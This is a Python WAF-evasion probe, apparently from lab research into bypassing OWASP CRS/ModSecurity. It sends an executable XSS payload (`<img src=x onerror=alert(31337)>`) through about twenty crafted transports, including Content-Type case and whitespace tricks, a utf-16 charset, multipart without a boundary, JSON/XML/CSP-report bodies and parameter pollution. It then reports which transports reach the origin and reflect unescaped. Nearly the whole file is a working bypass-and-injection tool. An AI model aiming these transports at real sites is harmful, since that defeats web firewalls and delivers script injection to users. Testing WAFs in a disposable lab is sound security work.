#!/usr/bin/env python3
"""Transport-evasion probe: does *how* an executable XSS payload is DELIVERED
change whether it reaches the reflective origin past OWASP CRS?

The payload-token axis (which bytes) and the reflection-context axis (where the
bytes land) are exhausted — CRS blocks every executable markup/JS vector at
every paranoia level, in every reflection context. This probe opens the third
axis: the **transport** — the HTTP method, Content-Type, and body framing used
to carry the payload to the origin's `q`.

CRS body inspection is content-type-gated: ModSecurity only parses a request
body into the collections the XSS rules target (ARGS / XML / JSON) when a body
*processor* matches the Content-Type, and rule 920420 rejects content-types
outside an allowlist. Where a processor is absent (or fails to parse) but the
*application* still recovers the payload from the raw body, the WAF sees inert
bytes and the origin reflects a live payload — a transport bypass that
multiplies across the entire executable catalog.

The reflect origin's `do_POST` reflects ANY non-urlencoded body verbatim into
the executable sink (raw-body mode), so for each transport the only open
question is: does CRS return 200, and does the payload reflect unescaped? This
probe fires one unique-marker executable payload through a matrix of transports
and reports, per transport: WAF status, whether the marker reflected raw
(executable), and a one-line CRS verdict snippet for diagnosis.

Run on the disposable host (axiomexec), never the dev box. The caller brings the
zoo up at a given paranoia level and passes --base; this script is pure client.
"""
import argparse
import http.client
import sys
import urllib.parse
from urllib.parse import urlsplit

# A unique, executable marker payload. The marker arg (31337) is distinctive so
# "did the raw payload reflect" is a precise substring test, not a fuzzy match
# against the page's own template. `<img src=x onerror=...>` executes via the
# body innerHTML sink the moment it reflects unescaped.
MARK = "31337"
PAYLOAD = f"<img src=x onerror=alert({MARK})>"
# A second, angle-bracket-free executable form for the JS-string family of
# contexts is not needed here — this probe fixes ctx=body to isolate the
# transport variable; context is swept separately once a channel is found.


def _conn(base: str) -> tuple[http.client.HTTPConnection, str]:
    u = urlsplit(base)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    return http.client.HTTPConnection(host, port, timeout=15), u.path or "/"


def fire(base: str, method: str, path: str, headers: dict, body) -> tuple[int, str]:
    """Send one fully-controlled request; return (status, body_text).

    http.client adds Host + Content-Length automatically but adds NO
    Content-Type unless we set one — which is exactly the control the
    no-content-type and odd-content-type transports require.
    """
    conn, _ = _conn(base)
    if isinstance(body, str):
        body = body.encode("utf-8", "replace")
    try:
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read(65536)
        return resp.status, raw.decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001 — a transport that breaks the wire is a result
        return -1, f"<wire-error: {e}>"
    finally:
        conn.close()


# ── Transport matrix ────────────────────────────────────────────────────────
# Each transport returns (method, path, headers, body) to deliver PAYLOAD to the
# origin's `q`. `qp` is the ctx-selecting query string (kept on the URL so the
# origin renders the body/innerHTML execution context regardless of transport).
def transports(qp: str):
    pl = PAYLOAD
    form = "q=" + urllib.parse.quote(pl)
    boundary = "----wafriftBOUNDARY31337"
    multipart = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="q"\r\n\r\n'
        f"{pl}\r\n"
        f"--{boundary}--\r\n"
    )
    json_valid = '{"q": ' + _json_str(pl) + "}"
    yield ("get_query", "GET", f"/?{qp}&q={urllib.parse.quote(pl)}", {}, None)
    yield ("post_form", "POST", f"/?{qp}", {"Content-Type": "application/x-www-form-urlencoded"}, form)
    yield ("post_form_charset16", "POST", f"/?{qp}", {"Content-Type": "application/x-www-form-urlencoded; charset=utf-16"}, form)
    yield ("post_form_ctcase", "POST", f"/?{qp}", {"Content-Type": "APPLICATION/X-WWW-FORM-URLENCODED"}, form)
    yield ("post_form_ctspace", "POST", f"/?{qp}", {"Content-Type": " application/x-www-form-urlencoded"}, form)
    yield ("post_textplain", "POST", f"/?{qp}", {"Content-Type": "text/plain"}, pl)
    yield ("post_noctype", "POST", f"/?{qp}", {}, pl)
    yield ("post_octet", "POST", f"/?{qp}", {"Content-Type": "application/octet-stream"}, pl)
    yield ("post_json_raw", "POST", f"/?{qp}", {"Content-Type": "application/json"}, pl)
    yield ("post_json_valid", "POST", f"/?{qp}", {"Content-Type": "application/json"}, json_valid)
    yield ("post_json_charset", "POST", f"/?{qp}", {"Content-Type": "application/json; charset=utf-8"}, pl)
    yield ("post_cloudevents_json", "POST", f"/?{qp}", {"Content-Type": "application/cloudevents+json"}, pl)
    yield ("post_csp_report", "POST", f"/?{qp}", {"Content-Type": "application/csp-report"}, pl)
    yield ("post_xml_raw", "POST", f"/?{qp}", {"Content-Type": "application/xml"}, pl)
    yield ("post_textxml", "POST", f"/?{qp}", {"Content-Type": "text/xml"}, pl)
    yield ("post_soap", "POST", f"/?{qp}", {"Content-Type": "application/soap+xml"}, pl)
    yield ("post_multipart", "POST", f"/?{qp}", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, multipart)
    yield ("post_multipart_related", "POST", f"/?{qp}", {"Content-Type": f"multipart/related; boundary={boundary}"}, multipart)
    yield ("post_multipart_nob", "POST", f"/?{qp}", {"Content-Type": "multipart/form-data"}, multipart)
    yield ("post_form_pollute", "POST", f"/?{qp}&q=benign", {"Content-Type": "application/x-www-form-urlencoded"}, form)


def _json_str(s: str) -> str:
    import json
    return json.dumps(s)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="WAF base, e.g. http://127.0.0.1:18106")
    ap.add_argument("--ctx", default="body")
    ap.add_argument("--pl", default="?", help="paranoia level, for the report label only")
    args = ap.parse_args()
    qp = f"ctx={args.ctx}"

    print(f"# transport probe base={args.base} ctx={args.ctx} PL={args.pl}", file=sys.stderr)
    print("pl\tctx\ttransport\twaf_status\treflected_raw\tverdict")
    for name, method, path, headers, body in transports(qp):
        status, text = fire(args.base, method, path, headers, body)
        reflected = PAYLOAD in text
        # One-line CRS/origin verdict snippet for diagnosis.
        verdict = _verdict(status, text, reflected)
        print(f"{args.pl}\t{args.ctx}\t{name}\t{status}\t{int(reflected)}\t{verdict}")
    return 0


def _verdict(status: int, text: str, reflected: bool) -> str:
    if status == -1:
        return text[:60]
    low = text.lower()
    if reflected:
        return "REFLECTS-EXECUTABLE"
    if status == 403:
        # ModSecurity 403 page is terse; note it so we know the WAF blocked.
        return "waf-403-blocked"
    if status == 200 and "reflect-origin" in low:
        return "200-origin-inert"  # reached origin but payload not reflected raw
    if status == 200:
        return "200-other"
    if "parse" in low or "200002" in text:
        return "body-parse-error"
    return f"status-{status}"


if __name__ == "__main__":
    raise SystemExit(main())
